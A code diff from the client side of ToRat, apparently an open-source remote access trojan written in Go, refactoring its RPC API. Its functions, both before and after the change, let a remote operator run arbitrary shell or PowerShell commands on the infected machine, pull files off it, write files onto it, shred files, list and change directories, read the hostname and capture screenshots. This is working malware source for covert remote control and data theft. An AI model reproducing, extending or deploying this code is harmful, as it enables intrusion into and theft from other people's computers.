@@ -1,69 +1,51 @@
 package client
 
 import (
+	"bytes"
 	"errors"
+	"image/png"
 	"io/ioutil"
 	"log"
 	"net"
 	"net/rpc"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"reflect"
-	"runtime"
 
-	"github.com/lu4p/ToRat/models"
+	"github.com/lu4p/ToRat/shared"
 	"github.com/lu4p/ToRat/torat_client/crypto"
-	"github.com/lu4p/ToRat/torat_client/screen"
 	"github.com/lu4p/cat"
+	"github.com/vova616/screenshot"
 )
 
 // API functions have this type
 type API int
 
-func (a *API) Shred(s *models.Shred, r *models.Void) error {
+func (a *API) Shred(s *shared.Shred, r *shared.Void) error {
 	return s.Conf.Path(s.Path)
 }
 
-func (a *API) Hostname(v models.Void, r *models.EncAsym) error {
+func (a *API) Hostname(v shared.Void, r *shared.EncAsym) error {
 	hostname := crypto.GetHostname(HostnamePath, s.pubKey)
 	*r = hostname
 	return nil
 }
 
-func (a *API) RunCmd(cmd models.Cmd, r *string) error {
-	var osshell string
+func (a *API) RunCmd(cmd shared.Cmd, r *string) error {
 	if cmd.Cmd == "" {
 		return errors.New("no command to execute")
 	}
-	var osshellargs []string
-	if runtime.GOOS == "linux" {
-		osshell = "/bin/sh"
-		osshellargs = []string{"-c", cmd.Cmd}
 
-	} else if runtime.GOOS == "windows" {
-		if cmd.Powershell {
-			osshell = "powershell"
-			osshellargs = []string{"-Command", cmd.Cmd}
-
-		} else {
-			osshell = "cmd"
-			osshellargs = []string{"/C", cmd.Cmd}
-		}
-	} else if runtime.GOOS == "darwin" {
-		osshell = "/bin/sh"
-		osshellargs = []string{"-c", cmd.Cmd}
-	}
-	execcmd := exec.Command(osshell, osshellargs...)
-	cmdout, err := execcmd.Output()
+	out, err := shared.RunCmd(cmd.Cmd, cmd.Powershell)
 	if err != nil {
 		return err
 	}
-	*r = string(cmdout)
+
+	*r = string(out)
 	return nil
 }
 
-func (a *API) SendFile(path string, r *models.File) error {
+func (a *API) SendFile(path string, r *shared.File) error {
 	content, err := ioutil.ReadFile(path)
 	if err != nil {
 		return err
@@ -79,11 +61,11 @@ func (a *API) SendFile(path string, r *models.File) error {
 	return nil
 }
 
-func (a *API) RecvFile(f models.File, r *models.Void) error {
+func (a *API) RecvFile(f shared.File, r *shared.Void) error {
 	return ioutil.WriteFile(f.Path, f.Content, f.Perm)
 }
 
-func (a *API) LS(v models.Void, r *models.Dir) (err error) {
+func (a *API) LS(v shared.Void, r *shared.Dir) (err error) {
 	r.Files, err = filepath.Glob("*")
 	if err != nil {
 		return
@@ -92,19 +74,29 @@ func (a *API) LS(v models.Void, r *models.Dir) (err error) {
 	return
 }
 
-func (a *API) Ping(v models.Void, r *string) error {
+func (a *API) Ping(v shared.Void, r *string) error {
 	// TODO implement
 	*r = "Pong"
 	return nil
 }
 
-func (a *API) Screen(v models.Void, r *[]byte) error {
-	var err error
-	*r, err = screen.Take()
-	return err
+func (a *API) Screen(v shared.Void, r *[]byte) error {
+	img, err := screenshot.CaptureScreen()
+	if err != nil {
+		return err
+	}
+
+	buf := new(bytes.Buffer)
+	if err := png.Encode(buf, img); err != nil {
+		return err
+	}
+
+	*r = buf.Bytes()
+
+	return nil
 }
 
-func (a *API) Reconnect(v models.Void, r *bool) error {
+func (a *API) Reconnect(v shared.Void, r *bool) error {
 	// TODO implement
 	return nil
 }
@@ -118,7 +110,7 @@ func (a *API) Cat(path string, r *string) error {
 	return nil
 }
 
-func (a *API) Cd(path string, r *models.Dir) (err error) {
+func (a *API) Cd(path string, r *shared.Dir) (err error) {
 	err = os.Chdir(path)
 	if err != nil {
 		return err
